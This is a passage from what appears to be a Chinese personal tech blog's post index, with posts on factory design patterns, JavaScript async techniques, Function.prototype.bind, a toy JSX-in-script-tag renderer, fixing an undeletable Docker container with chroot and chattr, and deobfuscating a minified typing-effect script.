的维护需求时，只需要修改工厂中的代码即可。 这里可以发现，由于 Reader 们都实现了Reader 这个抽象类，所以利用多态的特性，返回的实例可以是任意的子类，那么实际上可以将工厂的生产方法修改为可以根据需求返回不同子类的形式，代码如下： 123456789101112131415161718class ReaderFactory &#123; private ReaderFactory() &#123; &#125; public static Reader createReaderForFile(String filename, String readerType) throws FileNotFoundException &#123; Reader fileReader = new FileReader(new File(filename)); switch (readerType) &#123; case \"BufferedReader\": return new BufferedReader(fileReader); case \"LineNumberReader\": return new LineNumberReader(fileReader); ... default: return fileReader; &#125; &#125;&#125; 这样，在客户端调用工厂的生产方法时，通过提供第二个参数即可获得不同功能的 Reader 对象。 虽然多数设计模式的书籍或文章在阐述某个模式时都会使用 Java 作为实现语言，但设计模式本身是作用于 OOP 的理念上，所以其他语言中也都有设计模式的身影。对于简单工厂模式，Vue 在使用 rollup 打包后产生的代码（通过结合立即执行表达式IIFE和闭包），我个人认为就是它的一个实现。 所以，简单工厂模式封装了一部分类的初始化行为，并可以提供按需构建不同子类的功能。这种模式方便了客户端代码（即使用工厂的代码），使其并不需要考虑工厂的具体实现，而只是按需为工厂传递参数即可。 0x1 工厂方法模式虽然简单工厂模式方便了客户端代码，但是由于每次对功能的扩展都要修改工厂的内部代码，不但违反了“开放-封闭原则”，同时在工厂生产方法很大时，每次都要编译许多无关的代码，增大了开发的成本。 工厂方法模式就可以很好地解决上述问题。 为了举例，假设我们有一个 Pet 的接口，代码如下： 123interface Pet &#123; void say();&#125; 现在分别定义猫和狗实体类来实现该接口： 12345678910111213class Cat implements Pet &#123; @Override public void say() &#123; System.out.println(\"喵\"); &#125;&#125;class Dog implements Pet &#123; @Override public void say() &#123; System.out.println(\"汪\"); &#125;&#125; 为了按需获取 Pet 的实例，我们可以定义 PetFactory 工厂： 123456789101112131415161718192021class PetFactory &#123; private PetFactory() &#123;&#125; private static Pet DEFAULT_PET = new Pet() &#123; @Override public void say() &#123; System.out.println(\"Idk who am I\"); &#125; &#125;; public static Pet createPet(String petType) &#123; switch (petType) &#123; case \"Cat\": return new Cat(); case \"Dog\": return new Dog(); default: return DEFAULT_PET; &#125; &#125;&#125; 这就是简单工厂模式的一个实现，那么按照上面所说的问题，假设现在要新添加一个 Pet 实体，除了添加一个实现了 Pet 接口的类以外，另要修改 PetFactory.createPet 方法中的 switch。 那么同样的需求，如果用工厂方法模式来实现会是什么样呢？ 首先，需要把 PetFactory 从类转为接口： 123interface PetFactory &#123; Pet createPet();&#125; 然后针对 Cat 和 Dog 分别实现其工厂： 1234567891011121314// 这里因为逻辑很简单，所以工厂的生产方法只是简单返回实体class CatFactory implements PetFactory &#123; @Override public Pet createPet() &#123; return new Cat(); &#125;&#125;class DogFactory implements PetFactory &#123; @Override public Pet createPet() &#123; return new Dog(); &#125;&#125; 这样，客户端的代码可以这样写 123456public static void main(String[] args) &#123; PetFactory catFactory = new CatFactory(); PetFactory dogFactory = new DogFactory(); catFactory.createPet().say(); dogFactory.createPet().say();&#125; 在定义工厂的引用时，类型可直接定义为 PetFactory 接口，然后利用多态的特性来分发具体的工厂。这样一来，我们定义了一个用于创建对象的接口，让子类来决定实例化哪一个类。工厂方法使一个类的实例化延迟到其子类。 和简单工厂模式不同的是，工厂方法模式的客户端做了更多的工作，它需要知道某个实体类对应的具体工厂类。同时，在对实体类的种类进行扩展时，要同时定义这个新的实体类和其对应的工厂类。这样的缺点在于代码量比较大，修改的工作相对于简单工厂模式而言稍有复杂，而优点则在于解决了之前说的问题。即，遵循了“封闭-开放原则”，同时，通过添加新的类而不是修改原有的类来进行业务的扩展，使得按需编译成为可能，减少了开发的成本。 0x2 抽象工厂模式抽象工厂模式的定义是为创建一组相关或相互依赖的对象提供一个接口，并且无须指定它们的具体类，从字面意义上来理解，就可以理解为工厂方法模式的加强。也就是说，此时工厂的目标在于创建一系列相互影响或关联的实体类，我们把这些类叫做产品，而由于工厂的具体实现不同，所以同类产品也有着一定的差异，在这个横向的对比上，我们把它们叫做一个产品族。 一般来说，抽象工厂模式适用于比较大的项目。比如可以定义一套跨平台的业务接口，让工厂来生产BO们，共同配合以实现某个功能。那么针对不同的平台，就可以有不同的工厂来屏蔽平台之间的差异。而站在客户端的角度，我们只需要结合多态来实例化目标平台的工厂类，就可以通过通用的接口来完成所需的功能。在这个过程中，尽管工厂生成的产品们联系密切，但客户端依然不需要了解产品族中各产品之间的具体差异。 这即是说，抽象工厂模式把更多的工作放到了接口实现方这边。对于“功能扩展”这项工作，抽象工厂模式可以分为产品扩展和产品族扩展两种。可以发现，产品的扩展其实违背了“开放-封闭原则”，因为它不但要修改工厂接口，还要修改每个现有的工厂实现类；而产品族的扩展则十分优雅，因为抽象工厂模式主打的就是扩展产品族嘛。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"/categories/设计模式/"}],"tags":[]},{"title":"CallBack 与 Promise 与 Generator 与 async/await 的故事","slug":"AsyncJavascript","date":"2020-09-29T12:58:40.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2020/09/29/AsyncJavascript/","link":"","permalink":"/2020/09/29/AsyncJavascript/","excerpt":"","text":"0x0 前言之前在读 express 相关的项目时经常看到 async/await 关键字，所以就跑去查了一下文档，看完以后还是觉得云里雾里；前几天偶然看到阮一峰老师的一篇文章，文章中整理了当前 Javascript 处理异步的一些方式，并作了一些对比，尤其最后在提到 async/await 时使用 Generator 去模拟其行为，顿时觉得茅塞顿开。 于是这篇文章就作为一个简单的总结+个人的一些理解，就这样开始写下去了。 0x1 关于 Javascript 的异步之前有看到所谓 “异步就是多线程” 的言论，但是在上文提到的文章中，作者把异步看作是一种可以在两个任务中互相切换（并传递信息）的一种模式（这里的任务指按顺序执行的一段序列），那么根据这个思想，其实 Generator 的模式就可以看作是一种异步，于是它在配合 Javascript 的事件循环（Event Loop）后就可以做到一些奇妙的效果，详见下文。 众所周知，Javascript 是一门单线程的语言，这句话多少都令人有些疑惑（或者可能单纯是我比较愚钝），比如像 NodeJS 的 fs.readFile ，在 CallBack 被调用前，这个 “唯一” 的线程难道还是要自己去与文件系统交互吗；或者对于 setTimeout ，这个 “唯一” 的线程难道会通过在用户的代码中插入轮询来进行计时吗。 事实上，这里所谓的单线程指的是用户代码所在的线程（这里姑且称之为主线程），而对于计时器、文件读取这类的操作，Javascript 依然有相应的线程来完成这些任务。也就是说，用户的代码并不能进入到这些线程中来执行，但是可以通过 API 来委托它们执行任务，那么就需要一种方式，使得这些线程在执行完相应的任务后能通知到主线程，对于这种方式，首先能想到的就是 CallBack。 0x2 关于 CallBackCallBack 并不是专门用来解决异步问题的，它只是一个被作为参数传递给另一个函数的函数，这样看来其实像 Decorator 这种的都可以算作是一种 CallBack。 回到异步的话题上，在 Javascript 的一种异步模式中，CallBack 用于告知对应的任务线程，在执行完主线程分发的任务后调用之，从而让执行流回到主线程中。比如前文所述的 readFile，对应的代码大概如下: 1234const &#123; readFile &#125; = require('fs')readFile(..., (err, data) =&gt; &#123; ...&#125;) 这里 readFile 的第二个参数就是一个 CallBack，它委托与文件系统交互的线程去读取由第一个参数指明的文件。在它执行任务的期间，有可能成功也有可能失败，所以 NodeJs 大部分的 CallBack 的第一个参数都用来记录错误，后面的则用来处理成功后获取到的数据，在我看来这是一个非常优雅的模式，它并没有什么心智负担，写起来非常自然。 但是一旦异步的操作有了前后的顺序依赖，事情就变得不尽人意了，鼎鼎大名的回调地狱（CallBack Hell）就是由此产生的，还是之前读文件的例子，比如业务一定要按照 file1 -&gt; file2 -&gt; file3 -&gt; ... 这样的顺序来进行的话，那么回调就会一层套用一层，最终的结果是代码变得横向发展，这是十分不美观且难以维护的状态。 于是 Promise 出现了。 0x3 关于 PromisePromise 其实是一种新的回调模式，网络上有大量相关的 polyfill，看一下代码就可以明白内部的基本原理（这里特别推荐一下 yaku 这个库，贺老曾对此有过很高的评价）。 这里额外说明一件事，就是虽然 Promise 在大部分的实现里都以微任务来执行，但是标准中并没有提及这件事，以至于我见过的 polyfill 基本都是用 setTimeout 来模拟的，所以在写业务的时候其实不能过分依赖这一点。 回到上面的异步顺序依赖的问题，对于那种逻辑，如果用 CallBack 来写的话，大概是这个样子: 1234567891011121314151617181920212223const &#123; readFile &#125; = require('fs')readFile('file1', (err, data) =&gt; &#123; if (err) &#123; ... &#125; console.log(`File1 content: $&#123;data&#125;`) readFile('file2', (err, data) =&gt; &#123; if (err) &#123; ... &#125; console.log(`File2 content: $&#123;data&#125;`) readFile('file3', (err, data) =&gt; &#123; if (err) &#123; ... &#125; console.log(`File3 content: $&#123;data&#125;`) readFile('...', (err, data) =&gt; &#123; ... &#125;) &#125;) &#125;)&#125;) 这里仅仅读取了三个文件，代码的缩进就已经到了很深的程度了，而且冗余性特别大，尽管对于这个样例，错误处理的逻辑可能是完全一样的，每个回调对应的错误还是要分别处理。 而同样的逻辑，如果用 Promise 写出来是这样的: 1234567891011121314151617const &#123; readFile &#125; = require('fs').promisesreadFile('file1', &#123; encoding: 'utf8' &#125;).then(data =&gt; &#123; console.log(`File1 content: $&#123;data&#125;`) return readFile('file2', &#123; encoding: 'utf8' &#125;)&#125;).then(data =&gt; &#123; console.log(`File2 content: $&#123;data&#125;`) return readFile('file3', &#123; encoding: 'utf8' &#125;)&#125;).then(data =&gt; &#123; console.log(`File3 content: $&#123;data&#125;`)&#125;).catch(err =&gt; &#123; ...&#125;) 可以看到，Promise 很优雅地解决了上面说的两个问题，拯救被回调地狱折磨的前辈们于水火之中。 0x4 更进一步虽然 Promise 很优雅，可以很好地解决上面提到的问题，但是一个是因为程序员比较懒，一个是因为 Promise 写多了确实有点烦，所以大家就又开始找新的解决顺序依赖的方式。 先说为什么比较烦，上面的例子因为逻辑很简单，而且只有三个显式的顺序依赖所以可能不太明显，但是想象一下如果顺序很多，那么代码里基本上全是 then then then，一个是放眼望去基本看不出主要的逻辑，另一个是…顺序依赖其实是一个挺大众的需求，如果有一个语法糖能提供更好的支持，那真的是一件令人高兴的事情。 于是我们的主角就出场了，它叫 await ，平时只喜欢和 async 待在一起，对于具体的用法稍稍 STFW 一下就有很多，所以我比较想从 Generator + Promise 的角度来描写它，那么下面就先来说一下 Generator。 0x5 关于 GeneratorGenerator 这个概念（机制）也不是 Js 这门语言独有的，比如 Python 中就有同样的机制。在 Js 中，一个 Generator 是一个带星号的函数，内部可以通过 yield 关键字来“送出”和“接收”数据，它大概长下面的样子，这里就不详细介绍它了，具体的机制可以看相关的文档。 123456789function *ImaGenerator () &#123; const data = yield \"Send data from generator\" console.log(\"Get data from main:\", data)&#125;const gen = ImaGenerator()console.log(\"Get data from generator:\", gen.next().value)gen.next(\"Send data from main\") 可能是由于代码量比较少，平时写的时候还没用实际到过这项技术，不过我还是比较感谢曾经学习了它的自己，让我能够借助它来更好地理解 async/await。 前面说过，异步可以被理解成是一种在两个顺序流程之间切换并传递信息的运行模式，那么如果把这个思想落实到 Generator 上就可以发现，yield 关键字既可以让流程从 Generator 中切换到外部执行流，又可以携带特定的信息；next 方法在另一方面使得流程回到 Generator 中成为可能。 于是，通过观察前面 CallBack 和 Promise 阅读文件的例子，就可以发现其具备特定的规律，从而结合 Generator 写出如下的代码： 123456789101112131415161718192021222324252627282930313233// callback + generator 的例子function Thunkify (fn) &#123; return function argExceptCb (...args) &#123; return function argIncludeCb (cb) &#123; fn.call(fn, ...args, cb) &#125; &#125;&#125;const fs = require('fs')const readFile = Thunkify(fs.readFile)function *readFiles (...filenames) &#123; for (fn of filenames) &#123; const content = yield readFile(fn) console.log(content) &#125;&#125;function runThunkifyGen (gen) &#123; function next (err, data) &#123; const ret = gen.next(data) if (ret.done) return ret.value(next) &#125; next()&#125;runThunkifyGen(readFiles('file1', 'file2', 'file3'))console.log('Read done') 123456789101112131415161718192021// promise + generator 的例子const &#123; readFile &#125; = require('fs').promisesfunction autorun (gen) &#123; (function next (data) &#123; const ret = gen.next(data) if (ret.done) return ret.value.then(data =&gt; next(data.toString())) &#125;)()&#125;function *readFiles (...filenames) &#123; for (fn of filenames) &#123; const content = yield readFile(fn) console.log(content) &#125;&#125;autorun(readFiles('file1', 'file2', 'file3'))console.log(\"Read done\") 例子中的 autorun 和 runThunkifyGen 函数被称为 执行器，用于自动将流程在 Generator 和调用方之间切换，并保证读取的文件顺序。 可以看到，实际上执行器就是提取出了 callback 和 then 的部分，在这里用户需要关注的只有 readFiles 这一个函数，而两个例子中，readFiles 长得一模一样。 那么如果我们把目光着眼于更一般的场景，是否可以结合 Generator 和执行器来让其达到普适呢？答案是可以的，下面给出代码： 12345678910111213141516171819function async (fn) &#123; function step (gen, data) &#123; try &#123; var next = gen.next(data) &#125; catch (err) &#123; return Promise.reject(err) &#125; return next.done ? Promise.resolve(next.value) : Promise.resolve(next.value) .then(data =&gt; step(gen, data)) &#125; return function () &#123; const gen = fn() return step(gen) &#125;&#125; async 函数接受一个 Generator，然后返回一个新的函数，这个函数在内部递归调用 step，这个 step 其实就是执行器（其实可以通过 IIFE 使得 step 变成单例，不过这里就不考虑这些了）。 和上面不同的地方在于，前面的两个都分别假定了 yield 后面跟随的要么是一个 thunk，要么是一个promise，而 async 则支持 yield 后面跟随一般值，能做到这一点的原因在于 Promise.resolve 和 Promise.reject ，其具体的机制可以查看MDN。 那么该如何使用 async 呢，继续回到之前按顺序打开并读取文件的例子，我们的代码会变成这样： 12345678910const &#123; readFile &#125; = require('fs').promises const func1 = async(function *() &#123; const data1 = yield readFile('file1') const data2 = yield readFile('file2') const data3 = yield readFile('file3') console.log('data1:', data1.toString()) console.log('data2:', data2.toString()) console.log('data3:', data3.toString())&#125;) 已经对 async/await 有所了解的小伙伴可以发现，同样的逻辑，如果使用这一对新人，则代码会变成这样： 12345678910const &#123; readFile &#125; = require('fs').promisesconst func2 = async function() &#123; const data1 = await readFile('file1') const data2 = await readFile('file2') const data3 = await readFile('file3') console.log('data1:', data1.toString()) console.log('data2:', data2.toString()) console.log('data3:', data3.toString())&#125; 很相似，对吧？","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"一个关于 script 标签的 type 属性的另类用法","slug":"ScriptType","date":"2020-09-25T13:33:18.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2020/09/25/ScriptType/","link":"","permalink":"/2020/09/25/ScriptType/","excerpt":"","text":"0x00 前言今天出于好奇跑去 React 官网转了一圈，看到里面提供了一个 无需构建工具 的体验例子，看到代码后感觉很神奇，因为它直接在 script 里的 render 函数中写入了 JSX ，并且成功渲染到了视图里，但是这种语法显然不是被允许的，红色的 Uncaught SyntaxError: expected expression, got &#39;&lt;&#39; 是应该出现在 console 中的。 0x01 原理及实现思来想去，突然发现 script 中的 type 标签里并不是常规的 text/javascript ，而是非标准的 text/babel ，那么这个东西有什么影响呢？ 其实把这段代码复制到一个带语法高亮的编辑器中应该就能看到异样了，比如扔进我本地使用的 vscode 时就可以发现，script 标签中并没有提供语法高亮和代码补全功能。 STFW 后得知，对于这种 type ，浏览器不会将其看作将被执行的 script ，而是当作普通的标签元素来看待，而既然这里的 type 是 babel，上面的 script:src 也引入了 babel ，那么想来编译并执行这段纯文本就是它的工作了。 知道了这个原理后，就可以写出简单的渲染方法了，代码如下： 1234567891011121314151617181920212223242526272829&lt;!-- HTML 文件 --&gt;&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;title&gt;Render-Test&lt;/title&gt; &lt;script src=\"render.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"app\"&gt;&lt;/div&gt; &lt;script type=\"text/react\"&gt; console.log(\"Output msg to console\") render( &lt;div&gt; &lt;h1&gt;Hello, React!&lt;/h1&gt; &lt;spanInputBox&lt;/span&gt; &lt;input type=\"text\"&gt; &lt;button onclick=\"alert('Hello!')\"&gt;clickMe&lt;/button&gt; &lt;/div&gt;, document.getElementById('app') ) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; render.js 文件内容如下： 1234567891011121314151617window.onload = function () &#123; const pattern = /\\s*render\\s*\\(\\s*(&lt;.+&gt;)/gs const scriptList = document.querySelectorAll('script[type=\"text/react\"]') globalThis.render = function (template, node) &#123; node.innerHTML = template &#125; for (let script of scriptList) &#123; eval(script.textContent.replaceAll( pattern, (_, template) =&gt; `;render(\\`$&#123;template&#125;\\`` )) &#125;&#125; 大概思路就是找到所有 type 相符的 script 标签，给 jsx 的部分加上引号，然后把整坨内容扔进 eval 里跑一下，当然现实中肯定不会这么简单粗暴，这里只能说是一个 POC 吧。 0x02 总结没什么总结的，就是闲着没事水了一篇博客而已（","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"测试 Github Actions","slug":"GitActionsTest","date":"2020-09-03T06:15:11.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2020/09/03/GitActionsTest/","link":"","permalink":"/2020/09/03/GitActionsTest/","excerpt":"","text":"Congratulations to myself :-)","categories":[{"name":"杂项","slug":"杂项","permalink":"/categories/杂项/"}],"tags":[]},{"title":"记一次手贱的经历与解决办法","slug":"Docker-Chattr","date":"2020-09-01T02:01:35.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2020/09/01/Docker-Chattr/","link":"","permalink":"/2020/09/01/Docker-Chattr/","excerpt":"","text":"0x0 起因一直以来对 Linux 的权限管理都仅仅停留在 “知道有这种机制存在” 的程度上，最近为某比赛出题时因为要有 getshell 的环境，所以就趁机了解了一下其中的一些理论和对应的命令。 由于我本人平时使用的是 MacOS 系统，再加上赛题环境也要扔到 docker 中，所以在学习权限管理时在 docker 里开了一个容器作为环境，测试的命令包括 chown，chroot，lsattr，chattr… 等等（这里插一句题外话，为了在容器中运行 chattr ，需要在启动时加上 --cap-add LINUX_IMMUTABLE 参数来为其赋予一个 capability ），在了解到可以开始创建赛题环境的程度后，我退出了容器，并运行了 docker rm ... 来将测试用的容器删除掉。 正当我准备开始输入命令创建新的容器时，却看到 docker 并没有正常删除测试用容器，取而代之地返回了一条蜜汁信息（这里省略了容器对应的两个哈希，该哈希对应我上文提到的那个用于测试权限管理的容器）： 1Error response from daemon: container ...: driver \"overlay2\" failed to remove root filesystem: unlinkat /var/lib/docker/overlay2/.../diff/test/file: operation not permitted 可以看到，大意是 docker 没有权限删除容器中的 /test/file 文件，比较幸运地，我记得这个文件是经历了 chattr +a file 处理后的文件，这个隐藏属性使得文件只可被追加新的内容而不可被删除或者修改。 起初我觉得这个问题很好解决（实际也很好解决，只不过和我开始想的不同），如果是在 docker for linux 上，直接在宿主机切到对应的目录后运行 chattr -a file 去掉隐藏属性，然后继续运行 docker rm ... 删掉容器即可；docker for macos 无非就是多了一层 HyperKit，可以用 screen 进入到 vm 中（我本机上是 screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty），然后进行和上文相同的操作。 然而进去才发现，这个 vm 提供的命令太少了，根本没有 chattr 命令可用，尝试搜索是否有等效的命令可用也没有搜到，更没有人手贱到和我一样，所以现在的场景也没有先人的经验可以学习。虽然这一个容器本身并没有占多大的空间，但是强迫症使然，我还是想把它删除掉:-P 0x1 解决办法0x10 Hard Reset最初我尝试自己在 StackOverflow 上提出了这一问题，然而也不知道是因为环境描述的不到位还是因为自己小学水平的英文写作能力，下面的答复甚至都没有对应到这个问题上… 只有一位老哥给了还算靠谱的答复，他建议我强制重置 docker desktop for mac 的状态（Troubleshoot/Reset disk image 或者 Troubleshoot/Reset to factory defaults），这俩都会清空当前的所有的镜像和容器，后者还会顺手把应用重置成刚被安装后的状态。 确实是一个解决办法，不过因为我平时都是把 docker 当虚拟机用的，所以本机上存着各种镜像，其中还包括好多自定制的，一个一个导出来实在是太过麻烦，而我又不怎么了解这些镜像是怎么个存储机制，胡乱备份的话还担心弄出别的问题，所以就放弃了这个办法。 0x11 Chroot在 vm 里畅游了一阵子后，我偶然发现这货还是有 chroot 可以用的，于是随便切到一个包含根目录的容器层里（我本机的路径是 /var/lib/docker/overlay2/.../diff ，这里依然省略了哈希），试着执行了一下 chroot . /bin/bash ，虽然给了一条 groups: cannot find name for group ID 11 的奇怪信息，不过还是顺利地进入到了 bash 环境中，而且测试了一下后发现 chattr 命令可用。 这样的话就好办多了，在无法删除的文件所在的文件夹或父文件夹中构建出 chattr 的运行环境，然后利用 chroot 运行 chattr -a file 来删除文件的隐藏属性，再在宿主机中运行 docker rm ... 即可 在其他容器中（下文用 other 来指代）用 ldd 查看下 chattr 依赖的动态链接库，得到结果如下： 1234567root@docker-desktop:/# ldd $(which chattr) linux-vdso.so.1 (0x00007ffebb9fc000) libe2p.so.2 =&gt; /lib/x86_64-linux-gnu/libe2p.so.2 (0x00007f6ce8b0a000) libcom_err.so.2 =&gt; /lib/x86_64-linux-gnu/libcom_err.so.2 (0x00007f6ce8906000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6ce8515000) libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f6ce82f6000) /lib64/ld-linux-x86-64.so.2 (0x00007f6ce8f17000) 可以看到依赖库都在 /lib/x86_64-linux-gnu/ 和 /lib64/ 文件夹中，所以在目标文件夹（这里指无法删除的文件 file 所在的文件夹）中用 cp -R 把 other 中这两个文件夹中的内容拷贝过来，再把 chattr 的 ELF 文件拷到目标文件夹中，最后在目标文件夹中运行 chroot . ./chattr -a file 即可。 删除了隐藏属性后，切回到宿主机中，然后运行 docker rm ... 就可以顺利删除掉这个出了问题的容器了。","categories":[{"name":"Docker","slug":"Docker","permalink":"/categories/Docker/"}],"tags":[]},{"title":"CTF练习集","slug":"CTF-Exercises","date":"2020-08-04T03:50:11.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2020/08/04/CTF-Exercises/","link":"","permalink":"/2020/08/04/CTF-Exercises/","excerpt":"","text":"window.location = \"https://www.cnblogs.com/yuren123/\" 如果看到这段话，说明自动跳转没有作用，请访问链接","categories":[{"name":"CTF","slug":"CTF","permalink":"/categories/CTF/"}],"tags":[]},{"title":"函数 Function.prototype.bind 的几个场景","slug":"FunctionBind","date":"2020-08-04T01:54:30.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2020/08/04/FunctionBind/","link":"","permalink":"/2020/08/04/FunctionBind/","excerpt":"","text":"0x0 前言一直以来都没想到 bind 函数的具体应用场景，最近读某源码时偶然在一个类声明中看到了下面第一个场景中的代码，由此联想到了一些其他内容，这里记录一下 0x1 第一个场景相关的核心代码如下 1234// 类名为 Directivethis._update = function (val) &#123; this.update(val) //该方法同样被定义在该类中，用于更新属性，这里因篇幅原因不给出&#125;.bind(this) 该方法在这个类之后的代码中被作为回调函数传给了另一个 Watcher 对象，代码如下 1var watcher = this._watcher = new Watcher(..., this._update) 这个 Watcher 对象将 _update 函数作为一个属性保存在了自己的作用域中，并在用户触发相应的事件后执行回调。 这个场景下的本意是 Watcher 在监测到事件发生后调用 Directive._update 方法来更新对应的 Directive 实例中的属性，然而我们知道，Javascript 中的 this 是会根据上下文进行变化的（这里不考虑箭头函数等特殊情况），当 Watcher 把 _update 作为自己的属性时，这个 this 就从 Directive 变成 Watcher 了，之后的更新也都会发生在 Watcher 中，这显然偏离了本意。 而 bind 的作用在于，它强制绑定了代码中 this 的值，使这个函数在赋值给其他对象作为属性且通过该对象进行调用时依然以 bind 中的参数作为 this ，在这里就达到了场景本身的需求。 0x2 第二个场景上面的例子并不是一个经常会遇到的场景，下面给出一个更普遍一些的情况：假设我们在视图中有一系列按钮通过绑定事件来操作一个 Object 中的属性，由于在 js 的逻辑中也有可能用到同样的属性操作，所以这些操作可以作为该对象的方法，然后将该方法作为回调函数传给对应的 Listener ，代码大概如下 12345678910// 这段代码因为没有具体上下文所以可能显得有些刻意，不过足够说明问题本身了let runTime = new (function() &#123; this.data = 0 this.addData = function() &#123; this.data++; &#125;&#125;)();let btn = document.querySelector('#btn-addData');btn.onclick = runTime.addData; 这里试图在点击一个按钮后将 runTime.data 自增，在将回调函数绑定到 click 事件时使用了 btn.onclick = runTime.addData 这样的语句，然而需要注意的是，在绑定后，addData 中的 this 就不再是 runTime ，而是 btn 了，这样在点击后就会尝试递增 btn.data ，从而偏离了本意。 正确的做法和前面的例子一样，应该在 addData 的函数定义后加入 .bind(this) 语句，从而将 this 强制绑定为 runTime 对象。 0x3 第三个场景另外上面给出的 MDN 的链接中也有几个场景，不过我认为其中受用面最大的应该是 “快捷调用” 的场景，这里为了查阅方便来转述一下 场景的意图在于给经常调用的长对象方法提供一个捷径，比如想通过 Array.prototype.slice 来将一个类数组对象转换为真正的数组时，常规写法可能是 123var slice = Array.prototype.slice...slice.apply(arguments) 但是当这个函数需要经常被调用时，slice.apply 的写法还是有些令人厌烦，这时可以利用 bind 来将 apply 的 this 绑定为 Array.prototype.slice（这个 this 指的是 “apply 作为谁的方法被调用” 中的 “谁” 而不是 apply 的第一个参数），从而通过直接调用绑定后的函数（包装函数）来达到目的，代码如下 123var slice = Function.prototype.apply.bind(Array.prototype.slice)...slice(arguments) 这样就缩短了调用方法时所需的长前缀，写起来就能更愉快一些。","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"记一段 Js 代码的解读与思考","slug":"JS-Inspection","date":"2019-12-11T08:30:23.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2019/12/11/JS-Inspection/","link":"","permalink":"/2019/12/11/JS-Inspection/","excerpt":"","text":"0x0 前言最近逛别人博客的时候，偶然看到了下面这货： 立刻就被这个简约的小东西给吸引住了，于是对着它就是一发审查元素，想看看其具体的实现，在把主要的部分提取出来后得到如下内容： 1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Test&lt;/title&gt; &lt;meta charset=\"utf8\"&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"binft\"&gt;&lt;/div&gt; &lt;script&gt; var binft=function(e)&#123;function m(a)&#123;for(var d=document.createDocumentFragment(),c=0;a&gt;c;c++)&#123;var b=document.createElement(\"span\");b.textContent=String.fromCharCode(94*Math.random()+33);b.style.color=f[Math.floor(Math.random()*f.length)];d.appendChild(b)&#125;return d&#125;function g()&#123;var d=h[a.skillI];a.step?a.step--:(a.step=k,a.prefixP&lt;b.length?(0&lt;=a.prefixP&amp;&amp;(a.text+=b[a.prefixP]),a.prefixP++):\"forward\"===a.direction?a.skillP&lt;d.length?(a.text+=d[a.skillP],a.skillP++):a.delay?a.delay--:(a.direction=\"backward\",a.delay=l):0&lt;a.skillP?(a.text=a.text.slice(0,-1),a.skillP--):(a.skillI=(a.skillI+1)%h.length,a.direction=\"forward\"));e.textContent=a.text;e.appendChild(m(a.prefixP&lt;b.length?Math.min(c,c+a.prefixP):Math.min(c,d.length-a.skillP)));setTimeout(g,n)&#125;var b=\"\",h=\"\\u9752\\u9752\\u9675\\u4e0a\\u67cf\\uff0c\\u78ca\\u78ca\\u6da7\\u4e2d\\u77f3\\u3002 \\u4eba\\u751f\\u5929\\u5730\\u95f4\\uff0c\\u5ffd\\u5982\\u8fdc\\u884c\\u5ba2\\u3002 \\u6597\\u9152\\u76f8\\u5a31\\u4e50\\uff0c\\u804a\\u539a\\u4e0d\\u4e3a\\u8584\\u3002 \\u9a71\\u8f66\\u7b56\\u9a7d\\u9a6c\\uff0c\\u6e38\\u620f\\u5b9b\\u4e0e\\u6d1b\\u3002 \\u6d1b\\u4e2d\\u4f55\\u90c1\\u90c1\\uff0c\\u51a0\\u5e26\\u81ea\\u76f8\\u7d22\\u3002 \\u957f\\u8862\\u7f57\\u5939\\u5df7\\uff0c\\u738b\\u4faf\\u591a\\u7b2c\\u5b85\\u3002 \\u4e24\\u5bab\\u9065\\u76f8\\u671b\\uff0c\\u53cc\\u9619\\u767e\\u4f59\\u5c3a\\u3002 \\u6781\\u5bb4\\u5a31\\u5fc3\\u610f\\uff0c\\u621a\\u621a\\u4f55\\u6240\\u8feb\\uff1f\".split(\" \").map(function(a)&#123;return a+\"\"&#125;),l=2,k=1,c=5,n=75,f=\"rgb(110,64,170) rgb(150,61,179) rgb(191,60,175) rgb(228,65,157) rgb(254,75,131) rgb(255,94,99) rgb(255,120,71) rgb(251,150,51) rgb(226,183,47) rgb(198,214,60) rgb(175,240,91) rgb(127,246,88) rgb(82,246,103) rgb(48,239,130) rgb(29,223,163) rgb(26,199,194) rgb(35,171,216) rgb(54,140,225) rgb(76,110,219) rgb(96,84,200)\".split(\" \"),a=&#123;text:\"\",prefixP:-c,skillI:0,skillP:0,direction:\"forward\",delay:l,step:k&#125;;g()&#125;;binft(document.getElementById('binft')); &lt;/script&gt;&lt;/body&gt; 其中 js 的部分经历了压缩，随便找了个在线解压工具尝试格式化后，终于获得了一份勉强能看的代码。而由于最近刚刚了解了 js 混淆的含义与作用，这份代码又刚好经过了不太难的混淆处理，故准备拿它开刀，尝试自己分析一下。 0x1 相关问题0x10 恼人的条件表达式首先比较麻烦的就是 1a.step ? a.step--:(a.step = k, a.prefixP &lt; b.length ? (0 &lt;= a.prefixP &amp;&amp; (a.text += b[a.prefixP]), a.prefixP++) : \"forward\" === a.direction ? a.skillP &lt; d.length ? (a.text += d[a.skillP], a.skillP++) : a.delay ? a.delay--:(a.direction = \"backward\", a.delay = l) : 0 &lt; a.skillP ? (a.text = a.text.slice(0, -1), a.skillP--) : (a.skillI = (a.skillI + 1) % h.length, a.direction = \"forward\")) 这一坨迷之表达式了，对我而言非常有必要将其转换成普通的 if-else 语句，于是尝试 STFW 后得到如下三只： OpenGG 的 转换工具(会转成 IIFE) raybb 的 